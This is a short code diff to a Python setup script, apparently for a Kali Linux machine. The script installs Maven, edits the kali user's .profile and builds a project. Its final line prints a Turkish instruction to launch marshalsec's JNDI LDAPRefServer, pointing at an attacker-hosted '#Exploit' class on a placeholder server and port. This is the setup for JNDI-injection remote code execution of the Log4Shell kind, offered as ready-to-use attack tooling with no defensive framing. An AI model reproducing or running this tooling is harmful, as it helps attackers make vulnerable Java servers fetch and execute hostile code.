@@ -32,13 +32,15 @@ os.system("wget https://mirrors.estointernet.in/apache/maven/maven-3/3.6.3/binar
 os.system("tar -xvf apache-maven-3.6.3-bin.tar.gz")
 os.system("mv apache-maven-3.6.3 /opt/")
 os.system("cd ..")
-with open(".profile", "a") as f:
+with open("/home/kali/.profile", "a") as f:
     f.write("""
 M2_HOME='/opt/apache-maven-3.6.3'
 PATH="$M2_HOME/bin:$PATH"
 export PATH
 """)
+f.close()
 os.system("cd ..")
+os.system("sudo -su kali")
 os.system("mvn clean package -DskipTests")
 
 print("LDAP SERVER TAMAM KULLANMAK ICIN nohup java -cp ldap_server-1.0-all.jar marshalsec.jndi.LDAPRefServer [string] http://SERVERIP:PYTHONPORTU/#Exploit &")
